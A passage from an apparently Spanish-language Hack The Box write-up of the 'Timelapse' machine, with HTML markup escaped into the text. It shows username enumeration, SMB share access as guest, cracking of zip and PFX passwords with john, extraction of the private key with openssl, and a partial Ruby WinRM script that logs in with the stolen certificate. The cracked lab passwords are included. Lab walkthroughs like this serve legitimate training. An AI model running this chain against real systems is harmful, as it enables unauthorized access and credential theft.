&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;__/

Version: v1.0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; - 04/22/22 - Ronnie Flathers @ropnop

2022/04/22 20:12:12 &amp;gt;  Using KDC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
2022/04/22 20:12:12 &amp;gt;   timelapse.htb:88

2022/04/22 20:12:17 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:   administrator@timelapse.htb
2022/04/22 20:16:19 &amp;gt;  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; VALID USERNAME:   guest@timelapse.htb
2022/04/22 20:22:11 &amp;gt;  Done! Tested &lt;span class=&#34;m&#34;&gt;86771&lt;/span&gt; usernames &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; valid&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; in 599.200 seconds
 π ~/htb/timelapse ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Utilizando &lt;code&gt;guest&lt;/code&gt; como usuario con crackmapexec, identificamos el recurso compartido &lt;code&gt;Shares&lt;/code&gt; donde observamos que el usuario tiene permisos de lectura.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ crackmapexec smb timelapse.htb -u guest -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DC01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:timelapse.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; timelapse.htb&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;uest:
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             Share           Permissions     Remark
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             -----           -----------     ------
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             ADMIN$                          Remote Admin
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             C$                              Default share
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             IPC$            READ            Remote IPC
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             NETLOGON                        Logon server share
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             Shares          READ
SMB         timelapse.htb   &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC01             SYSVOL                          Logon server share
 π ~/htb/timelapse ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el recurso &lt;code&gt;Shares&lt;/code&gt; encontramos dos carpetas: \Dev vemos un archivo zip, \HelpDesk muestra multiples documentos y un archivo de instalación de &lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=46899&#34;&gt;LAPS&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse ❯ smbclient //timelapse.htb/Shares -u guest
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:39:15 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:39:15 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Dev                                 D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 15:40:06 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  HelpDesk                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:48:42 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;6367231&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1625003&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Dev
smb: &lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ev&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 15:40:06 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 15:40:06 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  winrm_backup.zip                    A     &lt;span class=&#34;m&#34;&gt;2611&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:46:42 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;6367231&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1625003&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ev&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;elpDesk
smb: &lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;elpDesk&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:48:42 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 11:48:42 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  LAPS.x64.msi                        A  &lt;span class=&#34;m&#34;&gt;1118208&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 10:57:50 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  LAPS_Datasheet.docx                 A   &lt;span class=&#34;m&#34;&gt;104422&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 10:57:46 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  LAPS_OperationsGuide.docx           A   &lt;span class=&#34;m&#34;&gt;641378&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 10:57:40 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  LAPS_TechnicalSpecification.docx      A    &lt;span class=&#34;m&#34;&gt;72683&lt;/span&gt;  Mon Oct &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 10:57:44 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;

        &lt;span class=&#34;m&#34;&gt;6367231&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;1625003&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;elpDesk&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---legacyy&#34;&gt;User - Legacyy&lt;/h1&gt;
&lt;h2 id=&#34;backup&#34;&gt;Backup&lt;/h2&gt;
&lt;p&gt;El archivo zip está protegido por contraseña, utilizamos &lt;code&gt;zip2john&lt;/code&gt; para obtener el hash y con john la contraseña para decomprimir los archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse/shares ❯ zip2john winrm_backup.zip &amp;gt; hash_zip
ver 2.0 efh &lt;span class=&#34;m&#34;&gt;5455&lt;/span&gt; efh &lt;span class=&#34;m&#34;&gt;7875&lt;/span&gt; winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, &lt;span class=&#34;nv&#34;&gt;cmplen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2405, &lt;span class=&#34;nv&#34;&gt;decmplen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2555, &lt;span class=&#34;nv&#34;&gt;crc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;12EC5683 &lt;span class=&#34;nv&#34;&gt;ts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;72AA &lt;span class=&#34;nv&#34;&gt;cs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;72aa &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
 π ~/htb/timelaps/shares ❯ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; hash_zip
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PKZIP &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
supremelegacy    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;winrm_backup.zip/legacyy_dev_auth.pfx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2022-03-29 21:41&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2.380g/s 8270Kp/s 8270Kc/s 8270KC/s surkerior..superkebab
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
 π ~/htb/timelapse/shares ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un certificado protegido en formato PKCS#12, utilizamos &lt;code&gt;pfx2john.py&lt;/code&gt; para obtener el hash y con john la contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/timelapse/shares ❯ /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &amp;gt; hash_pfx
 π ~/htb/timelapse/shares ❯ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; hash_pfx
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;pfx, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.pfx, .p12&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;PKCS#12 PBE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SHA1/SHA2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 256/256 AVX2 8x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Cost &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mac-type &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
thuglegacy       &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;legacyy_dev_auth.pfx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:46 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2022-03-29 21:44&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.02158g/s 69754p/s 69754c/s 69754C/s thuglife06..thsco04
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
 π ~/htb/timelapse/shares ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell---winrm-ssl&#34;&gt;Shell - WinRM SSL&lt;/h2&gt;
&lt;p&gt;El nombre del archivo zip nos indica un backup de WinRM por lo que el certificado podria ser utilizado para autenticarnos por winrm. Utilizamos openssl para generar un certificado y una clave.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Extract the private key&lt;/span&gt;
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key

&lt;span class=&#34;c1&#34;&gt;# Extract the certificate&lt;/span&gt;
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt

&lt;span class=&#34;c1&#34;&gt;# Decrypt the private key&lt;/span&gt;
openssl rsa -in legacy.key -out legacy-decrypted.key
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando la libreria &lt;a href=&#34;https://github.com/WinRb/WinRM&#34;&gt;WinRM&lt;/a&gt; con el certificado y clave como lo indica la &lt;a href=&#34;https://github.com/WinRb/WinRM#ssl&#34;&gt;documentacion SSL&lt;/a&gt;, creamos un pequeño script para autenticarnos y ejecutar comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;WinRM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://timelapse.htb:5986/wsman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;transport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:ssl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;:client_cert&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;legacy.crt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;:client_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;legacy-decrypted.key&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;:key_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;thuglegacy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

